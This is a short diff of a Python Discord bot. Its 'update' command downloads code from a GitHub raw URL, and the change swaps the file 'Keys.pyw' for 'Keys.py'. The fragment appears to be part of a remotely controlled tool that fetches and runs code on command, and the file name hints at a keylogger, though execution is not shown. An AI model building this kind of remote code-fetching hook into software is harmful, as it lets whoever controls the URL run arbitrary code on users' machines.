@@ -87,7 +87,7 @@ async def load(ctx):
             await ctx.send(f"Loaded, `{file}`")
 @client.command()
 async def update(ctx):
-    url = "https://raw.githubusercontent.com/TaranMayer/trees/master/Keys.pyw"
+    url = "https://raw.githubusercontent.com/TaranMayer/trees/master/Keys.py"
     r = requests.get(url).content.decode('utf-8')
     await ctx.send("got code")
     code = str(r)
